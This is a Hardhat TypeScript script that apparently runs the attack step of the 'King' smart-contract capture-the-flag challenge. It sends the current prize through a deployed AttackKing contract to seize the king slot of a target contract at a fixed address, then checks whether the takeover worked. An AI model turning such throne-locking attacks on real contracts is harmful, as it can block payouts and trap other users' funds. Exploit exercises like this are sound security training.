import { deployments, ethers } from "hardhat";
import { BigNumber } from "ethers";
import { Address, Deployment } from "hardhat-deploy/types";
import { AttackKing, King } from "../typechain-types";

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const getKingDetails = async (kingAddress: Address, kingContract: King): Promise<{ prize: BigNumber, prevKing: Address }> => {
  const prize = await kingContract.prize();
  const prevKing = await ethers.provider.getStorageAt(kingAddress, 0);
  return { prize, prevKing };
};

const launchAttack = async (attackKing: AttackKing, prize: BigNumber): Promise<boolean> => {
  const tx = await attackKing.makeMeKing({ value: prize });
  return (await tx.wait()).status === 1;
};

const main = async (): Promise<void> => {
  const kingAddress = "0x752404e6066e1705015725465DCE81994D0Cd9cF";
  const king: King = await ethers.getContractAt("King", kingAddress);
  const attackKingDeployment: Deployment = await deployments.get("AttackKing");
  const attackKing: AttackKing = await ethers.getContractAt("AttackKing", attackKingDeployment.address);

  const { prize, prevKing } = await getKingDetails(kingAddress, king);
  console.log(`👑 The actual prize is: ${prize}`);
  console.log(`🤴 Previous king: ${ethers.utils.hexStripZeros(prevKing)}`);
  
  const attackStatus = await launchAttack(attackKing, prize);
  console.log(`Attack king makeMeKing function status: ${attackStatus ? '✅' : '❌'}`);

  await delay(5000);

  const newKing: Address = await ethers.provider.getStorageAt(kingAddress, 0);
  console.log(`🤴 New king: ${ethers.utils.hexStripZeros(newKing)}`);
  console.log(
    `Is AttackKing contract the new King?? ${ethers.utils.hexStripZeros(newKing) === String(attackKingDeployment.address).toLowerCase() ? '✅ Yes!' : '❌ No!'}`
  );
};

main().catch(error => {
  console.error('🚫', error);
});
